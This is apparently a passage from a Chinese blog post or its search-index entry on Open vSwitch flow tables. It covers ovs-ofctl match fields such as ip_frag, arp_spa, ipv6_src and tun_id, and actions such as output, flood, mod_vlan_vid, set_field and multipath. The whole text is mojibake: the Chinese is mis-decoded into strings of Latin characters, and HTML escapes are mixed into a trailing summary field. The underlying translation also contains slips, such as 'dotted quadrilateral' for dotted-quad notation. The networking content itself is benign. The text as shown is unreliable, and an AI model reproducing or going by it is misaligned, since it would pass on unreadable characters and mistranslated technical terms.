‡è®°çš„æ•°æ®åŒ…ã€‚\nä½¿ç”¨dl_vlanå’Œdl_vlan_pcpä¹Ÿå¯ä»¥å®ç°æŸäº›åŒ¹é…å¯èƒ½æ€§ã€‚\nip_frag=frag_type å½“dl_typeæŒ‡å®šIPæˆ–IPv6æ—¶ï¼Œfrag_typeæŒ‡å®šè¦åŒ¹é…çš„IPç‰‡æ®µæˆ–éç‰‡æ®µç±»å‹ã€‚æ”¯æŒä»¥ä¸‹frag_typeå€¼ï¼š\nno\nä»…åŒ¹é…éåˆ†æ®µæ•°æ®åŒ…ã€‚\nyes\nåŒ¹é…æ‰€æœ‰ç‰‡æ®µã€‚\nfirst\nä»…åŒ¹é…åç§»é‡ä¸º0çš„ç‰‡æ®µã€‚\nlater\nä»…åŒ¹é…éé›¶åç§»é‡çš„ç‰‡æ®µã€‚\nnot_later åŒ¹é…é›¶ç¢çš„éç¢ç‰‡æ•°æ®åŒ…å’Œç¢ç‰‡ã€‚\narp_spa=ip[/netmask] arp_tpa=ip[/netmask] å½“dl_typeæŒ‡å®šARPæˆ–RARPæ—¶ï¼Œarp_spaå’Œarp_tpaåˆ†åˆ«ä¸æºå’Œç›®æ ‡IPv4åœ°å€åŒ¹é…ã€‚å¯ä»¥å°†åœ°å€æŒ‡å®šä¸ºIPåœ°å€æˆ–ä¸»æœºåï¼ˆä¾‹å¦‚192.168.1.1æˆ–www.example.comï¼‰ã€‚å¯é€‰çš„ç½‘ç»œæ©ç å…è®¸å°†åŒ¹é…é™åˆ¶ä¸ºIPv4åœ°å€å‰ç¼€ã€‚ç½‘ç»œæ©ç å¯ä»¥æŒ‡å®šä¸ºç‚¹åˆ†å››è¾¹å½¢ï¼ˆä¾‹å¦‚192.168.1.0/255.255.255.0ï¼‰æˆ–CIDRå—ï¼ˆä¾‹å¦‚192.168.1.0/24ï¼‰ã€‚\narp_sha=xx:xx:xx:xx:xx:xx arp_tha=xx:xx:xx:xx:xx:xx å½“dl_typeæŒ‡å®šARPæˆ–RARPæ—¶ï¼Œarp_shaå’Œarp_thaåˆ†åˆ«åŒ¹é…æºå’Œç›®æ ‡ç¡¬ä»¶åœ°å€ã€‚åœ°å€æŒ‡å®šä¸ºä»¥å†’å·åˆ†éš”çš„6å¯¹åå…­è¿›åˆ¶æ•°å­—ï¼ˆä¾‹å¦‚00:0A:E4:25:6B:B0ï¼‰ã€‚\narp_sha=xx:xx:xx:xx:xx:xx/xx:xx:xx:xx:xx:xx arp_tha=xx:xx:xx:xx:xx:xx/xx:xx:xx:xx:xx:xx å½“dl_typeæŒ‡å®šARPæˆ–RARPæ—¶ï¼Œarp_shaå’Œarp_thaåˆ†åˆ«åŒ¹é…æºå’Œç›®æ ‡ç¡¬ä»¶åœ°å€ã€‚åœ°å€æŒ‡å®šä¸ºä»¥å†’å·åˆ†éš”çš„6å¯¹åå…­è¿›åˆ¶æ•°å­—ï¼ˆä¾‹å¦‚00:0A:E4:25:6B:B0ï¼‰ï¼Œå¹¶åœ¨æ–œæ ååŠ ä¸Šé€šé…ç¬¦æ©ç ã€‚\narp_op=opcode å½“dl_typeæŒ‡å®šARPæˆ–RARPæ—¶ï¼Œarp_opä¸ARPæ“ä½œç åŒ¹é…ã€‚åªèƒ½æŒ‡å®š1åˆ°255ä¹‹é—´çš„ARPæ“ä½œç è¿›è¡ŒåŒ¹é…ã€‚\nipv6_src=ipv6[/netmask] ipv6_dst=ipv6[/netmask] å½“dl_typeä¸º0x86ddæ—¶ï¼ˆå¯èƒ½é€šè¿‡ç®€å†™å½¢å¼ï¼Œä¾‹å¦‚ipv6æˆ–tcp6ï¼‰ï¼ŒåŒ¹é…IPv6æºï¼ˆæˆ–ç›®æ ‡ï¼‰åœ°å€ipv6ï¼Œè¯¥åœ°å€å¯ä»¥æŒ‰RFC 2373ä¸­çš„è§„å®šæŒ‡å®šã€‚é¦–é€‰æ ¼å¼ä¸ºx:x:x:x:x:x:x:xï¼Œå…¶ä¸­xæ˜¯åœ°å€çš„å…«ä¸ª16ä½å—çš„åå…­è¿›åˆ¶å€¼ã€‚ ::çš„å•ä¸ªå®ä¾‹å¯ç”¨äºæŒ‡ç¤º16ä½é›¶çš„å¤šä¸ªç»„ã€‚å¯é€‰çš„ç½‘ç»œæ©ç å…è®¸å°†åŒ¹é…é™åˆ¶ä¸ºIPv6åœ°å€å‰ç¼€ã€‚ç½‘ç»œæ©ç è¢«æŒ‡å®šä¸ºIPv6åœ°å€ï¼ˆä¾‹å¦‚2001:db8:3c4d:1::/ffff:ffff:ffff:ffff::)æˆ–CIDRå—ï¼ˆä¾‹å¦‚2001:db8:3c4d:1::/64ï¼‰ã€‚æ‰“å¼€vSwitch 1.8åŠæ›´é«˜ç‰ˆæœ¬ï¼Œæ”¯æŒä»²è£æ©ç ï¼›æ—©æœŸç‰ˆæœ¬ä»…æ”¯æŒCIDRæ©ç ï¼Œå³CIDRå—å’Œç­‰åŒäºCIDRå—çš„IPv6åœ°å€ã€‚\nipv6_label=label å½“dl_typeä¸º0x86ddæ—¶ï¼ˆå¯èƒ½é€šè¿‡ç®€å†™å½¢å¼ï¼Œä¾‹å¦‚ipv6æˆ–tcp6ï¼‰ï¼ŒåŒ¹é…IPv6æµæ ‡ç­¾labelã€‚\ntun_id=tunnel-id[/mask] ###tunnel_id=tunnel-id[/mask]\nåŒ¹é…éš§é“æ ‡è¯†ç¬¦tunnel-idã€‚åªæœ‰é€šè¿‡å¸¦æœ‰å¯†é’¥çš„éš§é“åˆ°è¾¾çš„æ•°æ®åŒ…ï¼ˆä¾‹å¦‚å…·æœ‰RFC 2890å¯†é’¥æ‰©å±•åå’Œéé›¶å¯†é’¥å€¼çš„GREï¼‰æ‰ä¼šå…·æœ‰éé›¶çš„éš§é“IDã€‚å¦‚æœçœç•¥maskï¼Œåˆ™tunnel-idæ˜¯è¦åŒ¹é…çš„ç¡®åˆ‡éš§é“IDï¼›å¦‚æœæŒ‡å®šäº†maskï¼Œåˆ™maskä¸­çš„1ä½è¡¨ç¤ºtunnel-idä¸­çš„ç›¸åº”ä½å¿…é¡»å®Œå…¨åŒ¹é…ï¼Œè€Œ0ä½é€šé…ç¬¦åˆ™å°†è¯¥ä½åŒ¹é…ã€‚\ntun_flags=flags åŒ¹é…æ ‡å¿—ï¼ŒæŒ‡ç¤ºéš§é“å°è£…çš„å„ä¸ªæ–¹é¢ã€‚å½“å‰ï¼Œä»…å®šä¹‰ä¸€ä¸ªæ ‡å¿—ï¼š\noma\néš§é“åè®®æŒ‡ç¤ºè¿™æ˜¯ä¸€ä¸ªOAMæ§åˆ¶æ•°æ®åŒ…ã€‚\nå¯ä»¥åœ¨æ ‡å¿—å‰é¢åŠ ä¸Š+æˆ–-æ¥åˆ†åˆ«æŒ‡ç¤ºè¯¥æ ‡å¿—åº”åŒ¹é…ä¸ºå­˜åœ¨æˆ–ä¸å­˜åœ¨ã€‚å¦å¤–ï¼Œå¯ä»¥æŒ‡å®šæ²¡æœ‰å‰ç¼€çš„æ ‡å¿—ï¼Œå¹¶ç”¨|åˆ†éš”ã€‚è¡¨ç¤ºå®Œå…¨åŒ¹é…ã€‚\nè¯·æ³¨æ„ï¼Œè¾ƒæ–°ç‰ˆæœ¬çš„Open vSwitchå¯èƒ½ä¼šå¼•å…¥å…·æœ‰ä¸åŒå«ä¹‰çš„å…¶ä»–æ ‡å¿—ã€‚å› æ­¤ï¼Œä¸å»ºè®®åœ¨æ­¤å­—æ®µä¸Šä½¿ç”¨å®Œå…¨åŒ¹é…ï¼Œå› ä¸ºè¿™äº›æ–°æ ‡å¿—çš„è¡Œä¸ºæ˜¯æœªçŸ¥çš„ï¼Œåº”å¿½ç•¥ã€‚\nå¯¹äºééš§é“æ•°æ®åŒ…ï¼Œè¯¥å€¼ä¸º0ã€‚\næ­¤å­—æ®µæ˜¯åœ¨Open vSwitch 2.5ä¸­å¼•å…¥çš„ã€‚\ntun_src=ip[/netmask] tun_dst=ip[/netmask] åŒ¹é…éš§é“IPv4æºï¼ˆæˆ–ç›®æ ‡ï¼‰åœ°å€ipã€‚ä»…é€šè¿‡éš§é“åˆ°è¾¾çš„æ•°æ®åŒ…å°†å…·æœ‰éé›¶çš„éš§é“åœ°å€ã€‚è¯¥åœ°å€å¯ä»¥æŒ‡å®šä¸ºIPåœ°å€æˆ–ä¸»æœºåï¼ˆä¾‹å¦‚192.168.1.1æˆ–www.example.comï¼‰ã€‚å¯é€‰çš„ç½‘ç»œæ©ç å…è®¸å°†åŒ¹é…é™åˆ¶ä¸ºè¢«æ©ç çš„IPv4åœ°å€ã€‚å­ç½‘æ©ç å¯ä»¥æŒ‡å®šä¸ºç‚¹åˆ†å››è¾¹å½¢ï¼ˆä¾‹å¦‚192.168.1.0/255.255.255.0ï¼‰æˆ–CIDRå—ï¼ˆä¾‹å¦‚192.168.1.0/24ï¼‰ã€‚\nipv6 ç­‰åŒäºdl_type=0x86dd\ntcp6 ç­‰åŒäºdl_type=0x86dd,nw_proto=6\nudp6 ç­‰åŒäºdl_type=0x86dd,nw_proto=17\nsctp6 ç­‰åŒäºdl_type=0x86dd,nw_proto=132\nicmp6 ç­‰åŒäºdl_type=0x86dd,nw_proto=58\næµè¡¨åŠ¨ä½œ æ»¡è¶³åŒ¹é…æ¡ä»¶ä¹‹åå°†ä¼šæ‰§è¡Œçš„åŠ¨ä½œã€‚\noutput:port å°†æ•°æ®åŒ…è¾“å‡ºåˆ°OpenFlowç«¯å£å·portã€‚å¦‚æœportæ˜¯æ•°æ®åŒ…çš„è¾“å…¥ç«¯å£ï¼Œåˆ™ä¸è¾“å‡ºæ•°æ®åŒ…ã€‚\ngroup:group_id å°†æ•°æ®åŒ…è¾“å‡ºåˆ°OpenFlowç»„group_idã€‚ä»…OpenFlow 1.1+æ”¯æŒç»„è¡¨ã€‚æœ‰å…³æ›´å¤šè¯¦ç»†ä¿¡æ¯ï¼Œè¯·å‚è§ç»„è¯­æ³•ã€‚\nnormal ä½¿æ•°æ®åŒ…ç»è¿‡è®¾å¤‡çš„å¸¸è§„L2 / L3å¤„ç†ã€‚ ï¼ˆå¹¶éæ‰€æœ‰OpenFlowäº¤æ¢æœºéƒ½æ‰§è¡Œæ­¤æ“ä½œã€‚ï¼‰\nflood åœ¨æ‰€æœ‰äº¤æ¢æœºç‰©ç†ç«¯å£ä¸Šè¾“å‡ºæ•°æ®åŒ…ï¼Œè€Œä¸æ˜¯åœ¨æ¥æ”¶æ•°æ®åŒ…çš„ç«¯å£ä»¥åŠä»»ä½•ç¦ç”¨æ´ªæ³›çš„ç«¯å£ä¸Šè¿›è¡Œè¾“å‡ºï¼ˆé€šå¸¸ï¼Œè¿™äº›ç«¯å£æ˜¯IEEE 802.1Dç”Ÿæˆæ ‘åè®®ç¦ç”¨çš„ç«¯å£ï¼‰ã€‚\nall åœ¨æ‰€æœ‰äº¤æ¢æœºç‰©ç†ç«¯å£ä¸Šè¾“å‡ºæ•°æ®åŒ…ï¼Œè€Œä¸æ˜¯åœ¨æ¥æ”¶æ•°æ®åŒ…çš„ç«¯å£ä¸Šã€‚\nlocal åœ¨ä¸æœ¬åœ°ç½‘æ¡¥åç§°ç›¸åŒçš„ç½‘ç»œè®¾å¤‡å¯¹åº”çš„``æœ¬åœ°ç«¯å£\u0026rsquo;\u0026lsquo;ä¸Šè¾“å‡ºæ•°æ®åŒ…ã€‚\nin_port åœ¨æ¥æ”¶æ•°æ®åŒ…çš„ç«¯å£ä¸Šè¾“å‡ºæ•°æ®åŒ…ã€‚\nenqueue(port,queue) å°†æ•°æ®åŒ…æ”¾å…¥ç«¯å£portä¸­çš„æŒ‡å®šé˜Ÿåˆ—ä¸­ï¼Œè¯¥é˜Ÿåˆ—å¿…é¡»æ˜¯OpenFlowç«¯å£å·æˆ–å…³é”®å­—ï¼ˆä¾‹å¦‚LOCALï¼‰ã€‚æ”¯æŒçš„é˜Ÿåˆ—æ•°å–å†³äºäº¤æ¢æœºï¼›å…·ä½“å–å†³äºäº¤æ¢æœºã€‚ä¸€äº›OpenFlowå®ç°æ ¹æœ¬ä¸æ”¯æŒæ’é˜Ÿã€‚\ndrop ä¸¢å¼ƒæ•°æ®åŒ…ï¼Œå› æ­¤ä¸ä¼šè¿›è¡Œè¿›ä¸€æ­¥çš„å¤„ç†æˆ–è½¬å‘ã€‚å¦‚æœä½¿ç”¨ä¸¢å¼ƒåŠ¨ä½œï¼Œåˆ™ä¸èƒ½æŒ‡å®šå…¶ä»–åŠ¨ä½œã€‚\nmod_vlan_vid:vlan_vid ä¿®æ”¹æŠ¥æ–‡çš„VLAN IDã€‚æ ¹æ®éœ€è¦æ·»åŠ æˆ–ä¿®æ”¹VLANæ ‡è®°ä»¥åŒ¹é…æŒ‡å®šçš„å€¼ã€‚å¦‚æœæ·»åŠ äº†VLANæ ‡è®°ï¼Œåˆ™ä½¿ç”¨é›¶ä¼˜å…ˆçº§ï¼ˆè¯·å‚é˜…mod_vlan_pcpæ“ä½œæ¥è®¾ç½®æ­¤ä¼˜å…ˆçº§ï¼‰ã€‚\nmod_vlan_pcp:vlan_pcp ä¿®æ”¹æŠ¥æ–‡çš„VLANä¼˜å…ˆçº§ã€‚æ ¹æ®éœ€è¦æ·»åŠ æˆ–ä¿®æ”¹VLANæ ‡è®°ä»¥åŒ¹é…æŒ‡å®šçš„å€¼ã€‚æœ‰æ•ˆå€¼ä»‹äº0ï¼ˆæœ€ä½ï¼‰å’Œ7ï¼ˆæœ€é«˜ï¼‰ä¹‹é—´ã€‚å¦‚æœæ·»åŠ äº†VLANæ ‡è®°ï¼Œåˆ™ä½¿ç”¨çš„vidä¸ºé›¶ï¼ˆè¯·å‚é˜…mod_vlan_vidæ“ä½œè¿›è¡Œè®¾ç½®ï¼‰ã€‚\nstrip_vlan ä»æ•°æ®åŒ…ä¸­å‰¥ç¦»VLANæ ‡è®°ï¼ˆå¦‚æœå­˜åœ¨ï¼‰ã€‚\npush_vlan:ethertype å°†æ–°çš„VLANæ ‡ç­¾æ¨å…¥æ•°æ®åŒ…ã€‚ä»¥å¤ªç½‘ç±»å‹ç”¨ä½œæ ‡ç­¾çš„ä»¥å¤ªç½‘ç±»å‹ã€‚ä»…åº”ä½¿ç”¨ethertype 0x8100ã€‚ ï¼ˆç›®å‰å°šä¸æ”¯æŒè§„èŒƒå…è®¸çš„0x88a8ã€‚ï¼‰æ–°æ ‡ç­¾ä½¿ç”¨ä¼˜å…ˆçº§ä¸ºé›¶ä¸”æ ‡ç­¾ä¸ºé›¶ã€‚\nmod_dl_src:mac å°†æºä»¥å¤ªç½‘åœ°å€è®¾ç½®ä¸ºmacã€‚\nmod_dl_dst:mac å°†ç›®æ ‡ä»¥å¤ªç½‘åœ°å€è®¾ç½®ä¸ºmacã€‚\nmod_nw_src:ip å°†IPv4æºåœ°å€è®¾ç½®ä¸ºipã€‚\nmod_nw_dst:ip å°†IPv4ç›®æ ‡åœ°å€è®¾ç½®ä¸ºipã€‚\nmod_tp_src:port å°†TCPæˆ–UDPæˆ–SCTPæºç«¯å£è®¾ç½®ä¸ºportã€‚\nmod_tp_dst:port å°†TCPæˆ–UDPæˆ–SCTPç›®æ ‡ç«¯å£è®¾ç½®ä¸ºportã€‚\nmod_nw_tos:tos å°†IPv4 ToS / DSCPæˆ–IPv6æµé‡ç±»å­—æ®µä¸­çš„DSCPä½è®¾ç½®ä¸ºtosï¼Œè¯¥å€¼å¿…é¡»ä¸º0åˆ°255ä¹‹é—´çš„4çš„å€æ•°ã€‚æ­¤æ“ä½œä¸ä¼šä¿®æ”¹ToSå­—æ®µçš„ä¸¤ä¸ªæœ€ä½æœ‰æ•ˆä½ï¼ˆECNä½ï¼‰ã€‚\nmod_nw_ecn:ecn å°†IPv4 ToSæˆ–IPv6æµé‡ç±»åˆ«å­—æ®µä¸­çš„ECNæ¯”ç‰¹è®¾ç½®ä¸ºecnï¼Œè¯¥å€¼å¿…é¡»ä»‹äº0å’Œ3ä¹‹é—´ï¼ˆåŒ…æ‹¬0å’Œ3ï¼‰ã€‚æ­¤æ“ä½œä¸ä¼šä¿®æ”¹è¯¥å­—æ®µçš„å…­ä¸ªæœ€é«˜æœ‰æ•ˆä½ï¼ˆDSCPä½ï¼‰ã€‚\néœ€è¦OpenFlow 1.1æˆ–æ›´é«˜ç‰ˆæœ¬ã€‚\nmod_nw_ttl:ttl å°†IPv4 TTLæˆ–IPv6è·³æ•°é™åˆ¶å­—æ®µè®¾ç½®ä¸ºttlï¼ŒæŒ‡å®šä¸º0åˆ°255ä¹‹é—´çš„åè¿›åˆ¶æ•°ï¼ˆåŒ…æ‹¬0å’Œ255ï¼‰ã€‚ä½†æ˜¯ï¼Œæ²¡æœ‰å¾ˆå¥½åœ°æŒ‡å®šå°†ttlè®¾ç½®ä¸ºé›¶æ—¶çš„å¼€å…³è¡Œä¸ºã€‚\néœ€è¦OpenFlow 1.1æˆ–æ›´é«˜ç‰ˆæœ¬ã€‚\nresubmit:port resubmit([port],[table]) é‡æ–°æœç´¢æ­¤OpenFlowæµè¡¨ï¼ˆæˆ–ç”±è¡¨æŒ‡å®šå…¶ç¼–å·çš„è¡¨ï¼‰ï¼Œç”¨in_portå­—æ®µæ›¿æ¢ä¸ºç«¯å£ï¼ˆå¦‚æœæŒ‡å®šäº†portï¼‰ï¼Œå¹¶æ‰§è¡Œæ‰¾åˆ°çš„æ“ä½œï¼ˆå¦‚æœæœ‰ï¼‰ï¼Œä»¥åŠæ­¤æµæ¡ç›®ä¸­çš„ä»»ä½•å…¶ä»–æ“ä½œã€‚\nset_tunnel:id set_tunnel64:id å¦‚æœè¾“å‡ºåˆ°å°†æ•°æ®åŒ…å°è£…åœ¨éš§é“ä¸­å¹¶æ”¯æŒæ ‡è¯†ç¬¦ï¼ˆä¾‹å¦‚GREï¼‰çš„ç«¯å£ï¼Œåˆ™å°†æ ‡è¯†ç¬¦è®¾ç½®ä¸ºidã€‚å¦‚æœä½¿ç”¨set_tunnelå½¢å¼ï¼Œå¹¶ä¸”idå¯ä»¥å®¹çº³32ä½ï¼Œåˆ™æ­¤æ“ä½œå°†ä½¿ç”¨Open vSwitch 1.0å’Œæ›´é«˜ç‰ˆæœ¬æ”¯æŒçš„æ“ä½œæ‰©å±•ã€‚å¦åˆ™ï¼Œå¦‚æœidæ˜¯64ä½å€¼ï¼Œåˆ™éœ€è¦Open vSwitch 1.1æˆ–æ›´é«˜ç‰ˆæœ¬ã€‚\nset_queue:queue è®¾ç½®è¾“å‡ºæ•°æ®åŒ…æ—¶åº”ç”¨äºæ’é˜Ÿçš„é˜Ÿåˆ—ã€‚æ”¯æŒçš„é˜Ÿåˆ—æ•°å–å†³äºäº¤æ¢æœºï¼›å…·ä½“å–å†³äºäº¤æ¢æœºã€‚ä¸€äº›OpenFlowå®ç°æ ¹æœ¬ä¸æ”¯æŒæ’é˜Ÿã€‚\npop_queue å°†é˜Ÿåˆ—æ¢å¤ä¸ºåº”ç”¨ä»»ä½•set_queueæ“ä½œä¹‹å‰çš„å€¼ã€‚\nmove:src[start..end]-\u0026gt;dst[start..end] å°†å·²å‘½åçš„ä½ä»å­—æ®µsrcå¤åˆ¶åˆ°å­—æ®µdstã€‚ srcå’Œdstå¿…é¡»æ˜¯nicira-ext.hä¸­å®šä¹‰çš„NXMå­—æ®µåç§°ï¼Œä¾‹å¦‚NXM_OF_UDP_SRCæˆ–NXM_NX_REG0ã€‚æ¯ä¸ªå¼€å§‹å’Œç»“æŸå¯¹ï¼ˆåŒ…æ‹¬é¦–å°¾å¯¹ï¼‰å¿…é¡»æŒ‡å®šç›¸åŒçš„ä½æ•°ï¼Œå¹¶ä¸”å¿…é¡»é€‚åˆå…¶å„è‡ªçš„å­—æ®µã€‚å­˜åœ¨[start..end]çš„ç®€å†™å½¢å¼ï¼šä½¿ç”¨[bit]æŒ‡å®šå•ä¸ªä½ï¼Œæˆ–ä½¿ç”¨[]æŒ‡å®šæ•´ä¸ªå­—æ®µã€‚\nset_field:value[/mask]-\u0026gt;dst load:valueâˆ’\u0026gt;dst[start..end] å°†æ–‡å­—å€¼åŠ è½½åˆ°å­—æ®µæˆ–å­—æ®µçš„ä¸€éƒ¨åˆ†ä¸­ã€‚å¯¹äºset_fieldï¼Œåœ¨å­—æ®µdstçš„æƒ¯ç”¨è¯­æ³•ä¸­ç»™å‡ºäº†å€¼å’Œå¯é€‰æ©ç ï¼Œè¡¨ç¤ºä¸ºå­—æ®µåã€‚ä¾‹å¦‚ï¼Œset_fieldï¼š00ï¼š11ï¼š22ï¼š33ï¼š44ï¼š55-\u0026gt; eth_srcå°†ä»¥å¤ªç½‘æºåœ°å€è®¾ç½®ä¸º00ï¼š11ï¼š22ï¼š33ï¼š44ï¼š55ã€‚åŠ è½½æ—¶ï¼Œå€¼å¿…é¡»æ˜¯æ•´æ•°å€¼ï¼ˆåè¿›åˆ¶æˆ–ä»¥0xå¼€å¤´çš„åå…­è¿›åˆ¶å‰ç¼€ï¼‰ï¼Œè€Œdstæ˜¯è¯¥å­—æ®µçš„NXMæˆ–OXMåç§°ã€‚ä¾‹å¦‚ï¼Œloadï¼š0x001122334455-\u0026gt; OXM_OF_ETH_DST []ä¸å‰é¢çš„set_fieldç¤ºä¾‹å…·æœ‰ç›¸åŒçš„æ•ˆæœã€‚\nå‡ºäºå†å²åŸå› ï¼Œå­˜åœ¨è¿™ä¸¤ç§å½¢å¼ã€‚ Open vSwitch 1.1å¼•å…¥äº†NXAST_REG_LOADä½œä¸ºOpenFlow 1.0çš„Niciraæ‰©å±•ï¼Œå¹¶ä½¿ç”¨loadæ¥è¡¨è¾¾å®ƒã€‚åæ¥ï¼ŒOpen-Flow 1.2å¼•å…¥äº†ä¸€ä¸ªæ ‡å‡†çš„OFPAT_SET_FIELDæ“ä½œï¼Œè¯¥æ“ä½œä»…é™äºåŠ è½½æ•´ä¸ªå­—æ®µï¼Œå› æ­¤Open vSwitchæ·»åŠ äº†å…·æœ‰æ­¤é™åˆ¶çš„è¡¨å•set_fieldã€‚ OpenFlow 1.5å°†OFPAT_SET_FIELDæ‰©å±•åˆ°äº†å®ƒæˆä¸ºNXAST_REG_LOADçš„è¶…é›†çš„åœ°æ­¥ã€‚ Open vSwitchä¼šæ ¹æ®æ‰€ä½¿ç”¨çš„OpenFlowç‰ˆæœ¬è½¬æ¢ä¸¤ç§è¯­æ³•ï¼šOpenFlow 1.0å’Œ1.1ä¸­çš„NXAST_REG_LOADï¼›åœ¨OpenFlow 1.2ã€1.3å’Œ1.4ä¸­ï¼ŒNXAST_REG_LOADç”¨äºåŠ è½½æˆ–åŠ è½½å­å­—æ®µï¼Œå¦åˆ™ä¸ºOFPAT_SET_FIELDï¼› OpenFlow 1.5åŠæ›´é«˜ç‰ˆæœ¬ï¼ŒOFPAT_SET_FIELDã€‚\npush:src[start..end] åœ¨å †æ ˆé¡¶éƒ¨çš„å­—æ®µä¸­ï¼Œå‹å…¥å¼€å§‹ï¼ˆåŒ…æ‹¬ç»“æŸï¼‰ä½ã€‚\nç¤ºä¾‹ï¼špushï¼šNXM_NX_REG2 [0..5]å°†å­˜å‚¨åœ¨å¯„å­˜å™¨2ä½0åˆ°5ï¼ˆå«0å’Œ5ï¼‰ä¸­çš„å€¼å‹å…¥å†…éƒ¨å †æ ˆã€‚\npop:dst[start..end] ä»å †æ ˆçš„é¡¶éƒ¨å¼¹å‡ºï¼Œä»å¼¹å‡ºçš„å€¼ä¸­æ£€ç´¢åŒ…å«å¼€å§‹åˆ°ç»“æŸçš„ä½ï¼Œå¹¶å°†å®ƒä»¬å­˜å‚¨åœ¨dstä¸­çš„ç›¸åº”ä½ä¸­ã€‚\nç¤ºä¾‹ï¼špopï¼šNXM_NX_REG2 [0..5]ä»å †æ ˆé¡¶éƒ¨å¼¹å‡ºè¯¥å€¼ã€‚æ ¹æ®åˆšåˆšå¼¹å‡ºçš„å€¼çš„0è‡³5ä½ï¼Œå°†å¯„å­˜å™¨2çš„0è‡³5ä½ï¼ˆåŒ…æ‹¬0å’Œ5ï¼‰è®¾ç½®ä¸º1ã€‚\nmultipath(fields,basis,algorithm,n_links,arg,dst[start..end]) ä½¿ç”¨baseä½œä¸ºé€šç”¨å“ˆå¸Œå‚æ•°å¯¹å­—æ®µè¿›è¡Œå“ˆå¸Œå¤„ç†ï¼Œç„¶ååº”ç”¨å¤šè·¯å¾„é“¾æ¥é€‰æ‹©ç®—æ³•ï¼ˆå¸¦æœ‰å‚æ•°argï¼‰ä»0åˆ°n_linkså‡å»1æ¥é€‰æ‹©n_linksè¾“å‡ºé“¾æ¥ä¹‹ä¸€ï¼Œå¹¶å°†é“¾æ¥å­˜å‚¨åˆ°dst [start..end]ä¸­ï¼Œå®ƒå¿…é¡»æ˜¯å¦‚ä¸Šæ‰€è¿°çš„NXMå­—æ®µã€‚\nå…¶ä»–çš„è¯·å‚è€ƒå®˜æ–¹æ“ä½œæ‰‹å†Œ ","permalink":"https://www.typesafe.cn/posts/ovs-learn-5/","summary":"\u003ch1 id=\"openvswitch-flow-table-æµè¡¨\"\u003eOpenvSwitch flow table æµè¡¨\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003eOpenFlowï¼ˆOFï¼‰è¢«è®¤ä¸ºæ˜¯ç¬¬ä¸€ä¸ª\u003ca href=\"https://zh.wikipedia.org/wiki/%E8%BB%9F%E4%BB%B6%E5%AE%9A%E7%BE%A9%E7%B6%B2%E7%B5%A1\"\u003eè½¯ä»¶å®šä¹‰ç½‘ç»œ\u003c/a\u003eï¼ˆSDNï¼‰æ ‡å‡†ä¹‹ä¸€ã€‚å®ƒæœ€åˆåœ¨SDNç¯å¢ƒä¸­å®šä¹‰äº†é€šä¿¡åè®®ï¼Œä½¿SDNæ§åˆ¶å™¨èƒ½å¤Ÿä¸ç‰©ç†å’Œè™šæ‹Ÿçš„äº¤æ¢æœºå’Œè·¯ç”±å™¨ç­‰ç½‘ç»œè®¾å¤‡çš„è½¬å‘å¹³é¢ç›´æ¥è¿›è¡Œäº¤äº’ï¼Œä»è€Œæ›´å¥½åœ°é€‚åº”ä¸æ–­å˜åŒ–çš„ä¸šåŠ¡éœ€æ±‚ã€‚\u003c/p\u003e\u003c/blockquote\u003e\n\u003cp\u003eå¦‚æœæŠŠOpenFlowæ§åˆ¶å™¨æ¯”ä½œâ€œå¤§è„‘â€ï¼ŒOVSæµè¡¨å°±åƒæ˜¯â€œå¤§è…¿â€ä¸€æ ·æ¥å—æ¥è‡ªâ€œå¤§è„‘â€çš„æŒ‡ä»¤ï¼Œå†³å®šè¦å‘å“ªä¸ªæ–¹å‘å‰è¿›ã€‚ä½†OVSæµè¡¨åŠŸèƒ½æ›´åŠ å¼ºå¤§ï¼Œåœ¨æ²¡æœ‰OpenFlowæ§åˆ¶å™¨æ—¶ï¼Œä¹Ÿå¯ä»¥è‡ªä¸»å·¥ä½œï¼Œå®ƒæœ¬èº«ä¹Ÿä¾›ä¸€äº›å‘½ä»¤è®©æˆ‘ä»¬å¯ä»¥ç›´æ¥ç®¡ç†æµè¡¨ã€‚\u003c/p\u003e\n\u003ch1 id=\"æ“ä½œå‘½ä»¤\"\u003eæ“ä½œå‘½ä»¤\u003c/h1\u003e\n\u003ch3 id=\"æŸ¥çœ‹æµè¡¨è§„åˆ™\"\u003eæŸ¥çœ‹æµè¡¨è§„åˆ™\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# æŸ¥çœ‹br-tunä¸Šçš„å…¨éƒ¨æµè¡¨è§„åˆ™\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eovs-ofctl dump-flows br-tun\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"æ·»åŠ æˆ–ä¿®æ”¹æµè¡¨è§„åˆ™\"\u003eæ·»åŠ æˆ–ä¿®æ”¹æµè¡¨è§„åˆ™\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eovs-ofctl addâˆ’flowï¼addâˆ’flowsï¼modâˆ’flows â€œæµè¡¨åŒ¹é…æ¡ä»¶,actions\u003cspan style=\"color:#f92672\"\u003e=[\u003c/span\u003eåŠ¨ä½œ1\u003cspan style=\"color:#f92672\"\u003e][\u003c/span\u003e,åŠ¨ä½œ2â€¦\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003eâ€\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå¦‚æœä½ æœ‰è¿‡ç¼–ç¨‹çš„ç»éªŒï¼Œæµè¡¨è§„åˆ™å…¶å®å°±æ˜¯ä¸€ä¸ªä¸ªç®€å•çš„\u003ccode\u003eif\u003c/code\u003eè¯­å¥ï¼Œä¼ªä»£ç å¦‚ä¸‹ã€‚\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eif (æµè¡¨åŒ¹é…æ¡ä»¶){\n\tåŠ¨ä½œ1ï¼Œ\n\tåŠ¨ä½œ2...\n}\n\nif 